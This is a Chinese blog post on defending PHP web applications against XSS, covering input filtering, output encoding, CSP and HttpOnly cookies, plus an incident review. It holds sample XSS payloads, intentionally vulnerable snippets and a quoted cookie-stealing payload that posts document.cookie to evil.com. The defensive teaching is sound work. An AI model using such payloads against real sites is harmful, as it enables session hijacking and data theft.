---
title: "XSS 攻击防御实战：从输入过滤到输出编码的多层防护体系"
date: 2020-04-15T14:00:00+08:00
draft: false
tags: ["安全", "XSS", "Web安全", "PHP", "输入过滤"]
categories: ["安全"]
summary: "Web 应用 XSS 攻击防御的完整实践，从输入过滤、输出编码到 CSP 策略的多层防护体系，结合真实漏洞案例讲解防御要点。"
---

做 Web 开发，XSS（跨站脚本攻击）是最常见也最容易被忽视的安全漏洞之一。我们平台早年就出过一次 XSS 漏洞，用户在简历里插了段脚本，被其他企业用户查看时触发，盗了 Cookie。后来花了大力气做了完整的 XSS 防御体系。今天把防御实践整理出来。

## 一、XSS 攻击的三种类型

先理清 XSS 的三种类型，防御方式各有不同：

### 1.1 反射型 XSS

恶意脚本通过 URL 参数传递，后端直接把参数输出到页面。用户点击恶意链接后触发。

```
https://example.com/search?q=<script>alert(1)</script>
```

后端代码：
```php
echo "搜索结果: " . $_GET['q']; // 直接输出，XSS
```

### 1.2 存储型 XSS

恶意脚本被存储到数据库，其他用户查看时触发。危害最大，因为不需要诱导用户点链接，只要访问页面就中招。

典型场景：用户昵称、个人简介、评论、简历内容等用户输入的字段，存储后展示给其他用户。

### 1.3 DOM 型 XSS

前端 JavaScript 直接操作 DOM，把不可信数据插入到页面中，不经过后端。

```javascript
var name = location.hash.substring(1);
document.getElementById('name').innerHTML = name; // XSS
```

## 二、防御原则：输入过滤 + 输出编码

XSS 防御的核心原则：**永远不要信任用户输入，输出时必须根据上下文编码**。

很多人以为只要在输入时过滤就行了，这是误区。输入过滤是第一道防线，但输出编码才是根本。因为同一个数据在不同上下文（HTML、属性、JavaScript、CSS、URL）需要的编码方式不同，输入时无法预知输出场景。

## 三、第一层：输入过滤

输入阶段做基础过滤，拦截明显的恶意输入。

### 3.1 白名单校验

对有明确格式要求的字段，用白名单校验：

```php
// 手机号：只允许数字
if (!preg_match('/^1[3-9]\d{9}$/', $phone)) {
    throw new InvalidParamException('手机号格式错误');
}

// 邮箱
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    throw new InvalidParamException('邮箱格式错误');
}

// URL
if (!filter_var($url, FILTER_VALIDATE_URL)) {
    throw new InvalidParamException('URL格式错误');
}
```

白名单是最安全的方式，能通过校验的一定是合法数据。

### 3.2 富文本过滤

对于允许 HTML 的字段（如富文本编辑器、简历内容），不能直接 strip_tags 把所有标签都去掉（用户需要格式化），要用 HTML 净化器做白名单过滤。

我们用的是 HTMLPurifier：

```php
require_once '/path/to/HTMLPurifier.auto.php';

$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,b,i,u,a[href|title],img[src|alt],ul,ol,li,br,span,h1,h2,h3,h4');
$config->set('HTML.AllowedAttributes', 'a.href,a.title,img.src,img.alt,*.style');
$config->set('Attr.AllowedFrameTargets', ['_blank']);
$config->set('URI.AllowedSchemes', ['http' => true, 'https' => true, 'mailto' => true]);

$purifier = new HTMLPurifier($config);
$cleanHtml = $purifier->purify($dirtyHtml);
```

关键点：
- 只允许安全的标签和属性
- `a` 标签的 `href` 只允许 http/https/mailto，禁止 `javascript:` 协议
- `img` 标签的 `src` 只允许 http/https，禁止 `data:` 协议（防止 base64 注入脚本）
- 禁止 `on*` 事件属性（onclick、onload 等）
- 禁止 `<script>`、`<iframe>`、`<object>`、`<embed>` 等危险标签

HTMLPurifier 会自动移除危险标签和属性，还能修复不规范的 HTML。

### 3.3 长度限制

所有用户输入字段都要限制长度，防止超长输入攻击：

```php
if (mb_strlen($nickname) > 50) {
    throw new InvalidParamException('昵称不能超过50个字符');
}

if (mb_strlen($bio) > 500) {
    throw new InvalidParamException('简介不能超过500个字符');
}
```

## 四、第二层：输出编码

输出编码是 XSS 防御的核心。根据输出的上下文，用不同的编码方式。

### 4.1 HTML 上下文

输出在 HTML 标签内容中，用 `htmlspecialchars`：

```php
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

`ENT_QUOTES` 同时转义单引号和双引号，`ENT_HTML5` 用 HTML5 规范。

Yii2 的 `Html::encode()` 就是封装了这个：

```php
echo Html::encode($user->nickname);
```

### 4.2 HTML 属性上下文

输出在 HTML 属性中，除了 `htmlspecialchars`，还要确保属性值用引号包裹：

```php
// 正确
echo '<div data-name="' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '">';

// 错误：没有引号，攻击者可以注入属性
echo '<div data-name=' . htmlspecialchars($name) . '>';
```

### 4.3 JavaScript 上下文

输出在 JavaScript 代码中，要用 `JSON.stringify` 编码：

```php
$jsonData = json_encode($userData, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);
echo "<script>var userData = {$jsonData};</script>";
```

`JSON_HEX_TAG` 等选项把 `<`、`>`、`'`、`"`、`&` 转成 \uXXXX 形式，防止 `</script>` 突破脚本标签。

永远不要直接把用户输入拼到 JavaScript 字符串里：

```php
// 危险！
echo "<script>var name = '{$userInput}';</script>";
```

### 4.4 URL 上下文

输出在 URL 中（如 href、src），要验证协议并编码：

```php
// 验证协议
$url = $userInput;
if (!preg_match('/^https?:\/\//i', $url)) {
    $url = 'about:blank'; // 不是 http/https，用安全默认值
}
echo '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">链接</a>';
```

特别注意 `javascript:` 协议：

```php
// 危险！用户输入 javascript:alert(1)
echo '<a href="' . $userInput . '">点击</a>';
```

### 4.5 CSS 上下文

输出在 CSS 中，要严格限制允许的值，最好不要让用户直接控制 CSS：

```php
// 安全：只允许预定义的颜色
$allowedColors = ['red', 'blue', 'green', '#ff0000'];
$color = in_array($userColor, $allowedColors) ? $userColor : 'black';
echo "<div style='color: {$color}'>";
```

## 五、第三层：CSP（内容安全策略）

CSP 是浏览器层面的防护，通过 HTTP 头告诉浏览器哪些资源可以加载、哪些脚本可以执行。即使有 XSS 漏洞，CSP 也能限制攻击效果。

### 5.1 CSP 配置

```apache
# Apache 配置
Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self' https://api.example.com; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self';"
```

关键指令：
- `default-src 'self'`：默认只允许同源资源
- `script-src`：允许的脚本来源，`'unsafe-inline'` 允许内联脚本（如果能不用就不用）
- `img-src`：允许的图片来源，`data:` 允许 base64 图片
- `connect-src`：允许的 AJAX/WebSocket 连接目标
- `frame-src 'none'`：禁止 iframe
- `object-src 'none'`：禁止 Flash 等插件
- `base-uri 'self'`：限制 base 标签
- `form-action 'self'`：限制表单提交目标

### 5.2 报告模式

上线前先用报告模式测试，不拦截只报告：

```apache
Header set Content-Security-Policy-Report-Only "default-src 'self'; ...; report-uri /csp-report.php;"
```

收集一段时间的违规报告，确认没有误杀后再切换到强制模式。

### 5.3 Nonce 替代 unsafe-inline

`'unsafe-inline'` 会降低 CSP 的防护效果。更好的方式是用 Nonce：

```php
$nonce = bin2hex(random_bytes(16));
header("Content-Security-Policy: script-src 'self' 'nonce-{$nonce}';");

// 页面中的内联脚本加 nonce
echo "<script nonce='{$nonce}'>console.log('safe');</script>";
```

只有带正确 nonce 的内联脚本才能执行，攻击者注入的脚本没有 nonce，不会执行。

## 六、第四层：HttpOnly Cookie

XSS 攻击最常见的目的是盗取 Cookie。给 Cookie 加 `HttpOnly` 属性，JavaScript 就无法读取 Cookie，即使有 XSS 漏洞也盗不了。

```php
// PHP 设置 HttpOnly Cookie
setcookie('session_id', $sessionId, [
    'expires' => time() + 86400,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,      // 只在 HTTPS 下传输
    'httponly' => true,    // JavaScript 无法读取
    'samesite' => 'Lax',   // 防 CSRF
]);
```

Yii2 配置：

```php
'components' => [
    'user' => [
        'identityCookie' => [
            'name' => '_identity',
            'httpOnly' => true,
            'secure' => true,
            'sameSite' => 'Lax',
        ],
    ],
    'session' => [
        'cookieParams' => [
            'httponly' => true,
            'secure' => true,
            'samesite' => 'Lax',
        ],
    ],
],
```

## 七、真实案例复盘

说个我们平台出过的 XSS 漏洞。

### 7.1 漏洞场景

用户在简历的"自我评价"字段里输入了：

```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

这个字段是富文本，我们用了 HTMLPurifier 过滤，但配置里允许了 `img` 标签和 `onerror` 属性（配置错误，应该禁止所有 `on*` 属性）。

企业用户查看这份简历时，图片加载失败触发 `onerror`，Cookie 被发到攻击者服务器。攻击者用 Cookie 登录企业账号，下载了大量简历。

### 7.2 修复过程

1. **紧急修复**：修改 HTMLPurifier 配置，禁止所有 `on*` 属性，清掉数据库里已有的恶意内容
2. **全面排查**：审计所有用户输入字段，检查输出编码是否正确
3. **加 CSP**：上线 CSP 策略，限制脚本执行
4. **Cookie 加固**：所有 Cookie 加 HttpOnly + Secure + SameSite
5. **安全培训**：团队做 XSS 防御培训，建立代码安全规范

### 7.3 教训

- HTMLPurifier 的配置要仔细审查，`on*` 属性必须全部禁止
- 不能只靠输入过滤，输出编码和 CSP 是兜底防线
- Cookie 加 HttpOnly 是基本操作，能大幅降低 XSS 危害
- 安全漏洞要定期审计，不能等出了事才修

## 八、安全检查清单

上线前做 XSS 安全检查：

- [ ] 所有用户输入字段都有格式校验或长度限制
- [ ] 富文本字段用 HTMLPurifier 等净化器过滤，禁止危险标签和属性
- [ ] 所有输出到 HTML 的数据都经过 `htmlspecialchars` 编码
- [ ] 输出到 JavaScript 的数据用 `json_encode` + HEX 选项编码
- [ ] URL 参数验证协议，禁止 `javascript:` 等危险协议
- [ ] 所有 Cookie 设置 HttpOnly + Secure + SameSite
- [ ] 上线 CSP 策略，至少限制 script-src 和 object-src
- [ ] 定期用安全扫描工具（如 OWASP ZAP）做漏洞扫描
- [ ] 代码 Review 时关注用户输入的处理和输出编码

## 九、总结

XSS 防御是个系统工程，不能只靠某一层：

1. **输入过滤**：白名单校验 + 富文本净化，第一道防线
2. **输出编码**：根据上下文（HTML/属性/JS/CSS/URL）用不同编码方式，核心防线
3. **CSP**：浏览器层面限制脚本执行，兜底防线
4. **HttpOnly Cookie**：降低 XSS 危害，保护会话安全
5. **安全审计**：定期扫描 + Code Review，持续防护

XSS 漏洞的根源是"信任用户输入"。只要记住"所有用户输入都是不可信的，输出时必须编码"，大部分 XSS 漏洞都能避免。安全不是一次性的工作，是持续的过程。框架和工具能帮我们减少漏洞，但最终还是要靠开发者的安全意识。
